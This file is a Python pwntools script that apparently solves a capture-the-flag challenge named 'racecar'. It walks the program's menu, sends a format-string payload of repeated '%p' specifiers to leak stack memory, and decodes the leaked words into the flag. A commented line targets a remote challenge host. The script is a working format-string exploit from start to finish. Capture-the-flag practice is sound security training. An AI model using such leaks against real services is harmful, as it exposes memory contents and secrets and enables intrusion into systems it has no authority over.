from pwn import *
from binascii import unhexlify

p = process('./racecar')
# p = remote('83.136.253.251', 32474)
p.sendlineafter(b'Name:', b'jex')
p.sendlineafter(b'Nickname:', b'j3x')
p.sendlineafter(b'selection', b'2')
p.sendlineafter(b'car', b'2')
p.sendlineafter(b'race', b'1')
payload = b'%p '*30
p.sendlineafter(b'victory?', payload)
x = p.recv()
x = p.recv()
hexflag = ''.join(x.decode().split('this:')[1].split()[12:23][::-1]).replace('0x','')
flag = unhexlify(hexflag).decode()
print(f"\nFLAG: {flag[::-1]}\n")


